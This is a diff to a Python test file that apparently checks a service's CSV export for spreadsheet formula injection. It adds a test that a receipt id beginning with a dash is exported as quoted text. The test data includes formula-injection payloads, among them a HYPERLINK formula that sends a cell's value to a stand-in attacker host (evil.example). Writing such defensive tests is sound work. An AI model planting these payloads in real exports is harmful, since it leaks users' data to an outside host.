@@ -21,6 +21,7 @@ import _srv
 
 REPO_ROOT = Path(__file__).resolve().parent.parent
 EMAIL = "csv-owner@example.test"
+DASH_ID = "-DashLeadingId01"
 LABELS = {
     '=HYPERLINK("http://evil.example/?"&A2,"open")': "formula",
     "+1+1": "plus",
@@ -43,7 +44,15 @@ def vault(tmp_path_factory):
         "import auth, subscriptions;"
         f"subscriptions.record_customer_email('cus_csv', {EMAIL!r});"
         "subscriptions.record_subscription_event('cus_csv', 'active', time.time() + 86400 * 30, 'sub_csv');"
-        f"print(auth.create_session({EMAIL!r})[0])"
+        f"print(auth.create_session({EMAIL!r})[0]);"
+        # A receipt of this account whose id begins with '-' (written as the
+        # engine writes one, bound to the account as #266 binds new ones).
+        "import json, pathlib;"
+        f"d = pathlib.Path({str(data_dir)!r}) / 'receipts' / {DASH_ID!r}; d.mkdir(parents=True);"
+        f"(d / 'receipt.json').write_text(json.dumps({{'receipt_id': {DASH_ID!r}, "
+        "'created_at': '2026-09-25T00:00:00+00:00', 'hash_hex': 'ee' * 32, "
+        f"'source': 'sub:' + auth.email_id({EMAIL!r}), 'account_id': auth.email_id({EMAIL!r}), "
+        "'private': False, 'calendars_ok': 5, 'calendars_total': 5}))"
     )
     out = subprocess.run([sys.executable, "-c", prog], capture_output=True,
                          text=True, timeout=60)
@@ -65,6 +74,7 @@ def test_label_cells_are_never_formulas(vault):
     assert status == 200
     rows = list(csv.DictReader(io.StringIO(body.decode("utf-8"))))
     cells = {r["client_label"] for r in rows}
+    rows = [r for r in rows if r["receipt_id"] != "'" + DASH_ID]
     assert len(rows) == len(LABELS), "control: every anchored label is exported"
     for label, name in LABELS.items():
         if label[:1] in "=+-@\t\r":
@@ -72,3 +82,12 @@ def test_label_cells_are_never_formulas(vault):
             assert label not in cells, f"{name}: a formula cell reached the export"
         else:
             assert label in cells, f"{name}: an ordinary label was altered"
+
+
+def test_a_receipt_id_that_begins_with_a_dash_is_text(vault):
+    """Ids are url-safe base64, so about 1 in 64 begins with '-'."""
+    base, headers = vault
+    status, body, _ = _srv.request(base, "/api/me/anchors.csv", headers=headers)
+    ids = {r["receipt_id"] for r in csv.DictReader(io.StringIO(body.decode("utf-8")))}
+    assert "'" + DASH_ID in ids, ids
+    assert DASH_ID not in ids
